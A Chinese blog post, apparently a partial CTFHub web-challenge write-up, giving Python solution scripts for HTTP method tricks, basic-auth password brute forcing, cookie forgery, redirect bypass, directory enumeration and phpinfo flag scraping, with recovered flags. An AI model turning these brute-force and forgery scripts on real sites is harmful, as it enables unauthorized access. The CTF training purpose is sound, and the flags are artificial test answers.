<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTFHUB_Web_Partial_WriteUp, Python">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>CTFHUB_Web_Partial_WriteUp | valecalida&#39;s house</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>
    
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">valecalida's house</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">valecalida's house</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="valecasec" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>

        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="valecasec" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://www.ctfhub.com/img/ctfhub_logo.0265db54.svg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTFHUB_Web_Partial_WriteUp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
        
        position: absolute;
        right: 23.5vw;
        display: block;
    }

    .toc-fixed .toc-link::before{
        position: fixed!important;/*当toc的位置改为fixed时，.toc-link::before也要改为fixed*/
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Python/">
                                <span class="chip bg-color">Python</span>
                            </a>
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Python%E3%80%81CTF%E3%80%81WriteUp/" class="post-category">
                                Python、CTF、WriteUp
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2020-04-08
                </div>
                

                

                

                

                
            </div>

        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="Web–WriteUp"><a href="#Web–WriteUp" class="headerlink" title="Web–WriteUp"></a>Web–WriteUp</h1><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="一、HTTP协议"><a href="#一、HTTP协议" class="headerlink" title="一、HTTP协议"></a>一、HTTP协议</h3><h4 id="1、请求方式"><a href="#1、请求方式" class="headerlink" title="1、请求方式"></a>1、请求方式</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span>
<span class="token comment" spellcheck="true"># --author：valecalida--</span>
<span class="token comment" spellcheck="true"># Edit time: 2020/3/19 19:59</span>
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> request
<span class="token keyword">import</span> re
<span class="token triple-quoted-string string">"""
    HTTP Method is GET
    Use CTF**B Method, I will give you flag.
    Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.
"""</span>
rr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
url <span class="token operator">=</span> <span class="token string">"http://challenge-c2631c2870dc91e1.sandbox.ctfhub.com:10080/index.php"</span>
req <span class="token operator">=</span> request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"CTFHUB"</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>rr<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="2、基础认证"><a href="#2、基础认证" class="headerlink" title="2、基础认证"></a>2、基础认证</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span>
<span class="token comment" spellcheck="true"># --author：valecalida--</span>
<span class="token comment" spellcheck="true"># Edit time: 2020/3/19 19:53</span>
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> HTTPBasicAuthHandler<span class="token punctuation">,</span> build_opener<span class="token punctuation">,</span> HTTPPasswordMgrWithDefaultRealm
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span> URLError

username <span class="token operator">=</span> <span class="token string">'admin'</span>
f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'10_million_password_list_top_100.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
url <span class="token operator">=</span> <span class="token string">"http://challenge-b14d74b2bbccc186.sandbox.ctfhub.com:10080/flag.html"</span>
<span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    password <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    instance <span class="token operator">=</span> HTTPPasswordMgrWithDefaultRealm<span class="token punctuation">(</span><span class="token punctuation">)</span>
    instance<span class="token punctuation">.</span>add_password<span class="token punctuation">(</span>None<span class="token punctuation">,</span> url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
    auth_handler <span class="token operator">=</span> HTTPBasicAuthHandler<span class="token punctuation">(</span>instance<span class="token punctuation">)</span>
    opener <span class="token operator">=</span> build_opener<span class="token punctuation">(</span>auth_handler<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> opener<span class="token punctuation">.</span>open<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        html <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"用户名：admin 密码：%s"</span> <span class="token operator">%</span> password<span class="token punctuation">,</span> <span class="token string">"是正确答案"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag为："</span><span class="token punctuation">,</span> html<span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">except</span> URLError <span class="token keyword">as</span> e <span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="3、响应包源码"><a href="#3、响应包源码" class="headerlink" title="3、响应包源码"></a>3、响应包源码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span>
<span class="token comment" spellcheck="true"># --author：valecalida--</span>
<span class="token comment" spellcheck="true"># Edit time: 2020/3/19 20:56</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
rr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>

url <span class="token operator">=</span> <span class="token string">"http://challenge-226bf952c446eb7c.sandbox.ctfhub.com:10080/"</span>

res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>rr<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="4、cookie"><a href="#4、cookie" class="headerlink" title="4、cookie"></a>4、cookie</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span>
<span class="token comment" spellcheck="true"># --author：valecalida--</span>
<span class="token comment" spellcheck="true"># Edit time: 2020/3/19 20:09</span>
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
url <span class="token operator">=</span> <span class="token string">"http://challenge-dd1412b01a02d5dd.sandbox.ctfhub.com:10080/"</span>

header <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"admin=1"</span>
<span class="token punctuation">}</span>
req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"GET"</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="5、302跳转"><a href="#5、302跳转" class="headerlink" title="5、302跳转"></a>5、302跳转</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># -- author : valecalida --</span>
<span class="token comment" spellcheck="true"># edit_time: 2020/3/20 上午3:34</span>
<span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://challenge-061acc63c590e9b4.sandbox.ctfhub.com:10080/index.php"</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="一、信息泄露"><a href="#一、信息泄露" class="headerlink" title="一、信息泄露"></a>一、信息泄露</h2><h3 id="1、目录遍历"><a href="#1、目录遍历" class="headerlink" title="1、目录遍历"></a>1、目录遍历</h3><p>这里通过观察目录的情况，发现目录都是 <code>/flag_in_here/1/%d</code> 的样式，于是构造脚本</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span>
<span class="token comment" spellcheck="true"># --author：valecalida--</span>
<span class="token comment" spellcheck="true"># Edit time: 2020/4/5 15:31</span>
<span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> re


<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    num_list <span class="token operator">=</span> <span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    url_1 <span class="token operator">=</span> <span class="token string">"http://challenge-6ccebf9522010cca.sandbox.ctfhub.com:10080/flag_in_here/"</span>
    url_2 <span class="token operator">=</span> <span class="token string">"/flag.txt"</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> num_list<span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> num_list<span class="token punctuation">:</span>
            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
            url <span class="token operator">=</span> url_1 <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> url_2
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag_in_here/1/%d下没有flag.txt这个文件"</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"^ctfhub{.*}"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"当访问%s时获取答案：\n\t[+] %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>url<span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>
                    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">continue</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得到的结果是</p>
<pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>1987f2dcecfe6cc28241015c225ce28c33aef1f7<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="2、PHPINFO"><a href="#2、PHPINFO" class="headerlink" title="2、PHPINFO"></a>2、PHPINFO</h3><p>由于题目提示页面中将会直接出现flag，所以直接构建脚本</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python3
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span>
<span class="token comment" spellcheck="true"># --author：valecalida--</span>
<span class="token comment" spellcheck="true"># Edit time: 2020/4/5 15:52</span>
<span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> re


<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>
    <span class="token punctuation">]</span>
    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
    url <span class="token operator">=</span> <span class="token string">"http://challenge-a0372dd0c18f0f3c.sandbox.ctfhub.com:10080/"</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
        link <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"(.*)\" class.*"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"访问的时候出现了问题"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        new_url <span class="token operator">=</span> url <span class="token operator">+</span> link<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>new_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;tr.*>(ctfhub{.*}) &lt;.*"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>
            <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得到的结果是</p>
<pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>1c7fbb0f603c9e003a7cdec1a09b74fa8e95ea57<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="3、备份文件下载"><a href="#3、备份文件下载" class="headerlink" title="3、备份文件下载"></a>3、备份文件下载</h3><h4 id="3-1、网站源码"><a href="#3-1、网站源码" class="headerlink" title="3.1、网站源码"></a>3.1、网站源码</h4><p>​        当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
